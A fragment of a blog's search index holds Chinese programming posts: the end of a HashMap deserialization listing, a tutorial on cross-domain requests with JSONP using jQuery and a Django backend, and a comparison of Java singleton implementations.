DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                    DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                    (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                    MAXIMUM_CAPACITY :</span><br><span class="line">                    tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                        (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><ul><li><a href="http://zhangshixi.iteye.com/blog/672697" target="_blank" rel="noopener">深入Java集合学习系列：HashMap的实现原理</a></li><li><a href="http://www.importnew.com/25049.html" target="_blank" rel="noopener">图解集合 4 ：HashMap</a></li><li><a href="https://tech.meituan.com/java-hashmap.html" target="_blank" rel="noopener">Java 8系列之重新认识HashMap</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 集合 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域请求解决方法——jsonp</title>
      <link href="/CORS-JSONP/"/>
      <url>/CORS-JSONP/</url>
      
        <content type="html"><![CDATA[<p>Javascript出于安全方面的考虑，不允许跨域调用其他页面的对象，但这样却给平时的开发带来了不少麻烦，这里把涉及到跨域的问题进行了简单地整理。</p><h2 id="同源策略"><a class="markdownIt-Anchor" href="#同源策略"></a> 同源策略</h2><h3 id="什么是域origin"><a class="markdownIt-Anchor" href="#什么是域origin"></a> 什么是域（origin）</h3><p>域是由三部分组成：<code>URI Schema</code>（协议类型）、<code>host name</code>（域名）、<code>port number</code>（端口号），举个例子：</p><ul><li><code>http://www.a.com</code>这个页面，<code>URI Schema</code>是http，<code>host name</code>是<code>www.a.com</code>，<code>port number</code>是默认的80；</li><li><code>https://www.b.com:8080/test/</code>这个页面，<code>URI Schema</code>是https，<code>host name</code>是<code>www.b.com</code>，<code>port number</code>是8080。</li></ul><p>上面两个页面的三个部分全部不相同，所以它们就是不同的域。下面表格可以更好地看出什么是同域：</p><table><thead><tr><th>URL</th><th>说明</th><th>是否允许通信</th></tr></thead><tbody><tr><td><code>http://www.a.com/a.js</code><br><code>http://www.a.com/b.js</code></td><td>同一域名下</td><td>允许</td></tr><tr><td><code>http://www.a.com/lab/a.js</code><br><code>http://www.a.com/script/b.js</code></td><td>同一域名下不同文件夹</td><td>允许</td></tr><tr><td><code>http://www.a.com:8000/a.js</code><br><code>http://www.a.com/b.js</code></td><td>同一域名，不同端口</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>https://www.a.com/b.js</code></td><td>同一域名，不同协议</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>http://70.32.92.74/b.js</code></td><td>域名和域名对应ip</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>http://script.a.com/b.js</code></td><td>主域相同，子域不同</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>http://a.com/b.js</code></td><td>同一域名，不同二级域名（同上）</td><td>不允许</td></tr><tr><td><code>http://www.b.com/a.js</code><br><code>http://www.a.com/b.js</code></td><td>不同域名</td><td>不允许</td></tr></tbody></table><h3 id="同源策略-2"><a class="markdownIt-Anchor" href="#同源策略-2"></a> 同源策略</h3><p>它限制了某个域下的文档或者js与另一个域中的资源交互的方式，它提供了一种安全机制，这种安全机制可以避免来自恶意网站的攻击。同源策略要求浏览器允许来自某个网页上的js请求来自另一个网页的数据，当且仅当两个页面来自相同的域。</p><p>通过同源策略可以阻止来自恶意网站的脚本通过其他网站的DOM获取其他网站的信息。可以避免CSRF和XSS攻击。</p><ul><li>同源策略限制的是浏览器或者其他提供类似浏览器服务的软件，这只是一个规范，所以浏览器是否遵守这个规范也不一定，所以IE浏览器判断同源的时候就不必考虑端口号；</li><li>同源策略限制的js，而图片、css这些事不存在同源策略限制的</li></ul><h2 id="jsonp方式的原理"><a class="markdownIt-Anchor" href="#jsonp方式的原理"></a> jsonp方式的原理</h2><ul><li>浏览器的同源策略把跨域请求都禁止了</li><li>HTML的<code>&lt;script&gt;</code>标签是例外，可以突破同源策略从其他来源获取数据</li><li>我们可以通过<code>&lt;script&gt;</code>标签引入jsonp文件，然后通过一系列JS操作获取数据</li></ul><p>实现方法：通过页面中增加一个<code>&lt;script&gt;</code>标签，标签的<code>src</code>指向的是另外一个域的能够提供数据的url，同时将一个本地的<code>callback</code>方法传给服务端，服务端返回的时候将会自动指向<code>callback</code>方法。</p><p>1.通过JS在页面中append如下标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"application/javascript"</span> <span class="attr">src</span>=<span class="string">"http://www.b.com/test?callback=parseResponse"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>增加该标签之后，浏览器就会立即去请求这个url，由于<code>&lt;script src=&quot;&quot;&gt;</code>方式是不受同源策略限制的，可以避免跨域限制。</p><p>2.服务端收到callback参数之后，将它拼接在返回的数据中，返回的数据如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parseResponse(&#123;"name":"hax", "gender":"Male"&#125;);</span><br></pre></td></tr></table></figure><p>3.这样返回之后，就调用页面上的<code>parseResponse</code>方法，就达到了数据处理的目的。</p><p>4.最后将刚刚新增加到页面中的<code>&lt;script&gt;</code>元素删除。</p><h2 id="采用jsonp解决跨域问题"><a class="markdownIt-Anchor" href="#采用jsonp解决跨域问题"></a> 采用jsonp解决跨域问题</h2><p>由于本人技术水平有限，也在网上找了许多方案，但是大多没有成功（主要自己太菜了），最后结合了多个博客的讲解以及尝试，最后使用jsonp成功解决了自己遇到的问题，不过写这篇博客距离当时解决所隔时间太长，无法列出当时帮助到自己的大神们，求谅解。<br></p><p>由于后台采用了Django，故后台使用Python进行演示，其他的后台框架仿照完成即可。</p><h3 id="前端"><a class="markdownIt-Anchor" href="#前端"></a> 前端</h3><p>代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submitComment</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">'GET'</span>,</span><br><span class="line">        url: url,</span><br><span class="line">        data: $(<span class="string">"#forml"</span>).serialize(),</span><br><span class="line">        crossDomain: <span class="literal">true</span>,</span><br><span class="line">        dataType: <span class="string">'jsonp'</span>,</span><br><span class="line">        jsonp: <span class="string">'callback'</span>,</span><br><span class="line">        jsonpCallback: <span class="string">'callback'</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(response);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Ajax error!'</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        complete: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"complete"</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上各参数详解：</p><table><thead><tr><th>参数名</th><th>参数类型</th><th>默认值</th><th>解析</th></tr></thead><tbody><tr><td>type</td><td>String</td><td>‘GET’</td><td>请求方式(‘POST’或’GET’)，其他HTTP请求方法，如PUT和DELETE也可使用，但是仅部分浏览器支持</td></tr><tr><td>url</td><td>String</td><td>当前页地址</td><td>发送请求地址</td></tr><tr><td>data</td><td>String</td><td></td><td>发送服务器的数据。将自动转换为请求字符串格式，其他详细解析课件w3school</td></tr><tr><td>crossDomain</td><td>Boolean</td><td>同域请求为false，跨域请求为true</td><td>若想在同一域内强制跨域请求(如jsonp形式)，例如，想让服务器重定向到另一个域，则需要将其设置为true</td></tr><tr><td>dataType</td><td>String</td><td></td><td>预期服务器返回的数据类型，详细可用值见下表</td></tr><tr><td>jsonp</td><td>String</td><td></td><td>在一个jsonp请求中重写回调函数的名字。这个值用来替代在&quot;callback=？&quot;这种GET或POST请求中的URL参数里的callback部分</td></tr><tr><td>jsonpCallback</td><td>String</td><td>jQuery自动生成的随机函数名</td><td>为jsonp请求指定回调函数名，用来取代自动生成的函数名，这样管理请求更容易，也能方便地提供回调函数和错误处理</td></tr><tr><td>success</td><td>Function</td><td></td><td>请求成功后的回调函数。有服务器返回，并根据dataType参数进行处理后的数据</td></tr><tr><td>error</td><td>Function</td><td></td><td>请求失败时调用此函数，具体可见w3school</td></tr><tr><td>complete</td><td>Function</td><td></td><td>请求完成后的回调函数(请求成功与失败都调用)，具体可见w3school</td></tr></tbody></table><p>dataType可用值表：</p><table><thead><tr><th>可用值</th><th>解析</th></tr></thead><tbody><tr><td>xml</td><td>返回XML文档，可用jQuery处理</td></tr><tr><td>html</td><td>返回纯文本HTML信息</td></tr><tr><td>script</td><td>返回纯文本JavaScript代码，不会自动缓存结果</td></tr><tr><td>json</td><td>返回json数据</td></tr><tr><td>jsonp</td><td>jsonp格式数据。使用JSONP形式调用函数时，如&quot;myurl?callback=?&quot;jQuery将自动替换?为正确的函数名，以执行回调函数</td></tr><tr><td>text</td><td>返回纯文本字符串</td></tr></tbody></table><p><strong>注意：</strong></p><ul><li>由于采用跨域请求，不管我们如何设置<code>type</code>参数，请求方式一定为<code>GET</code></li><li>开始调试时，每次在控制台都可以看到response，但是<code>success</code>的function就是没有调用，每次都是调用了<code>error</code>和<code>complete</code>的function，后来网上一直查，最终发现后台也需要相应的配合</li><li>由于不太明白<code>jsonp</code>与<code>jsonpCallback</code>参数的用法，所以直接将两个参数值赋一样的值</li></ul><h3 id="django后台"><a class="markdownIt-Anchor" href="#django后台"></a> Django后台</h3><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shop_comment</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment"># 以下是一些从请求中取出参数的操作</span></span><br><span class="line">    省略......</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = dict()</span><br><span class="line">        result[<span class="string">"returnInfo"</span>] = <span class="number">1</span></span><br><span class="line">        comment_list = list()</span><br><span class="line">        <span class="comment"># 以下代码是将数据库的操作，查到后append到comment_list里</span></span><br><span class="line">        省略......</span><br><span class="line">        result[<span class="string">"data"</span>] = comment_list</span><br><span class="line">        return_result = json.dumps(result)</span><br><span class="line">        data = <span class="string">'%s(%s);'</span> % (<span class="string">'callback'</span>, return_result)</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(data, <span class="string">'text/javascript'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        data = <span class="string">'%s(%s);'</span> % (<span class="string">'callback'</span>, &#123;<span class="string">'result'</span>: e.message&#125;)</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(data, <span class="string">'text/javascript'</span>)</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>跨域请求方式都是<code>GET</code></li><li>返回一定要用HttpResponse，不能使用JsonResponse</li><li>开始当只有返回一个参数时，并没用使用<code>json.dumps()</code>方法，前台可以正常调用<code>success</code>的方法。后来当有多个参数时，前台就一直调用<code>error</code>和<code>complete</code>的方法，后来自己尝试使用了dumps之后，发现就正常了</li></ul><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><ul><li><a href="http://www.w3school.com.cn/jquery/ajax_ajax.asp" target="_blank" rel="noopener">W3school的《jQuery ajax - ajax() 方法》</a></li><li><a href="http://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html" target="_blank" rel="noopener">Rain Man的《JavaScript跨域总结与解决办法》</a></li><li><a href="https://my.oschina.net/jasonultimate/blog/550737" target="_blank" rel="noopener">一条大河波浪宽的《ajax跨域请求原理及解决方案分析》</a></li><li><a href="https://segmentfault.com/a/1190000002799156" target="_blank" rel="noopener">别天的《JSONP原理及实现跨域方式》</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单例模式</title>
      <link href="/singleton-mode/"/>
      <url>/singleton-mode/</url>
      
        <content type="html"><![CDATA[<h2 id="单例模式的特点"><a class="markdownIt-Anchor" href="#单例模式的特点"></a> 单例模式的特点</h2><ul><li>单例类只能有一个实例</li><li>单例类必须创建自己唯一的实例</li><li>单例类必须给其他对象提供这一实例</li></ul><h2 id="饿汉-vs-懒汉"><a class="markdownIt-Anchor" href="#饿汉-vs-懒汉"></a> 饿汉 vs 懒汉</h2><ul><li>饿汉：声明实例引用时即实例化</li><li>懒汉：静态方法第一次被调用前不实例化，也即懒加载。对于创建实例代价大，且不定会使用时，使用懒加载可以减少开销</li></ul><h2 id="解决方案"><a class="markdownIt-Anchor" href="#解决方案"></a> 解决方案</h2><h3 id="在多线程环境中能工作但是效率不高不建议面试采用懒汉"><a class="markdownIt-Anchor" href="#在多线程环境中能工作但是效率不高不建议面试采用懒汉"></a> 在多线程环境中能工作，但是效率不高，不建议面试采用（懒汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Singleton1 &#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton1 instance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton1 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Singleton1();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：线程安全，可确保正常使用（不考虑通过反射调用私有构造方法），只有一个实例</li><li>缺点：每次获取实例都需要申请锁，开销大，效率低</li></ul><h3 id="加同步锁前后两次判断实例是否存在懒汉"><a class="markdownIt-Anchor" href="#加同步锁前后两次判断实例是否存在懒汉"></a> 加同步锁前后两次判断实例是否存在（懒汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton2</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton2 instance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton2 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Singleton2<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton2();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：不需要在每次调用时加锁，效率比上一个高</li><li>缺点：虽然使用了<code>synchronized</code>，但本质上是线程不安全的</li></ul><h3 id="双重检查double-check下的懒汉"><a class="markdownIt-Anchor" href="#双重检查double-check下的懒汉"></a> 双重检查（Double Check）下的懒汉</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton3 instance;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton3</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton3 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Singleton3<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton3();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：使用了双重检查，避免了线程不安全，同时避免了不必要的锁开销</li><li>缺点：无</li><li><strong>注意：使用<code>volatile</code>关键字的目的不是保证可见性（<code>synchronized</code>已经保证了可见性），而是为了保证顺序性。具体来说，<code>instance = new Singleton3()</code>不是原子操作，实际上被拆分为了三步：1) 分配内存；2) 初始化对象；3) 将<code>instance</code>指向分配的对象内存地址。 如果没有<code>volatile</code>，可能会发生指令重排序，使得<code>instance</code>先指向内存地址，而对象尚未初始化，其它线程直接使用<code>instance</code>引用进行对象操作时出错。详细原理可参见《<a href="http://www.infoq.com/cn/articles/double-checked-locking-with-delay-initialization" target="_blank" rel="noopener" title="双重检查锁定与延迟初始化">双重检查锁定与延迟初始化</a>》</strong></li></ul><h3 id="利用静态变量饿汉"><a class="markdownIt-Anchor" href="#利用静态变量饿汉"></a> 利用静态变量（饿汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton4</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton4 instance = <span class="keyword">new</span> Singleton4();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton4 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：实现简单，无线程同步问题</li><li>缺点：在类装载时完成实例化。若该实例一直未被使用，则会造成资源浪费</li></ul><h3 id="利用静态代码块饿汉"><a class="markdownIt-Anchor" href="#利用静态代码块饿汉"></a> 利用静态代码块（饿汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton5</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton5 instance;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton5</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        instance = <span class="keyword">new</span> Singleton5();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton5 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：实现简单，无线程同步问题</li><li>缺点：在类装载时完成实例化。若该实例一直未被使用，则会造成资源浪费</li></ul><h3 id="实现按需创建实例强烈推荐懒汉"><a class="markdownIt-Anchor" href="#实现按需创建实例强烈推荐懒汉"></a> 实现按需创建实例（强烈推荐）（懒汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton6</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Nested</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> Singleton6 instance = <span class="keyword">new</span> Singleton6();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton6 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Nested.instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：无线程同步问题，实现了懒加载。因为只有调用<code>getInstance()</code>时才会装载内部类，才会创建实例。同时因为使用内部类，先调用内部类的线程会获得类初始化锁，从而保证内部类的初始化（包括实例化它所引用的外部类对象）线程安全。即使内部类创建外部类的实例<code>Singleton6 instance = new Singleton6()</code>发生指令重排也不会引起双重检查下的懒汉模式中提到的问题，因此无须使用<code>volatile</code>关键字。</li><li>缺点：无</li></ul><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><hr /><ul><li><a href="http://www.cnblogs.com/java-my-life/archive/2012/03/31/2425631.html" target="_blank" rel="noopener">java_my_life的《JAVA与模式》之单例模式</a></li><li><a href="http://www.jasongj.com/design_pattern/singleton/" target="_blank" rel="noopener">技术世界的Java设计模式（十） 你真的用对单例模式了吗？</a></li><li><a href="http://www.infoq.com/cn/articles/double-checked-locking-with-delay-initialization" target="_blank" rel="noopener">InfoQ的双重检查锁定与延迟初始化<br /></a></li><li>《剑指offer》（第二版）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
